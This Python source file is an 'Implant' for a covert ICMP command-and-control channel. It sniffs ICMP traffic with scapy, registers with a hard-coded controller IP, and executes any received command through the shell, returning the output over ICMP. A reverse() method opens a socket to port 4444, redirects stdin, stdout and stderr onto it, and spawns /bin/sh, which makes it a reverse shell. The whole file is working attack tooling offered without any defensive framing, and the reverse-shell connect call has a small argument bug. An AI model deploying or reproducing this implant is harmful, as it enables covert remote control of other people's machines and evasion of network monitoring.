#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
import shlex
from shellylib import Host
import time
from threading import Timer
from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen
import subprocess
import socket
import pty
import os

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.controller_ip = controller_ip
        

    def join(self, shellpack):
        self.send(shellpack['ip'], "join")

    def reverse(self, shellpack):
        s=socket.socket()
        s.connect(shellpack['ip'], 4444)
        print(shellpack['ip'])
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        pty.spawn("/bin/sh")

    def instruction(self, shellpack):
        try:
            cmd = shellpack['data'].decode()

            output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
            self.send(self.controller_ip, "instruction", output)
            
        except TimeoutExpired:
            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
        except Exception:
            self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR")

if __name__ == "__main__":
    print("[ Setting up implant... ]")
    print("[ ICMP Sniffing Started ]")
    
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)

    print("[ Shellpack log ]")
    # Send join command
    implant.send(implant.controller_ip, "join")

    # Start sniffing
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
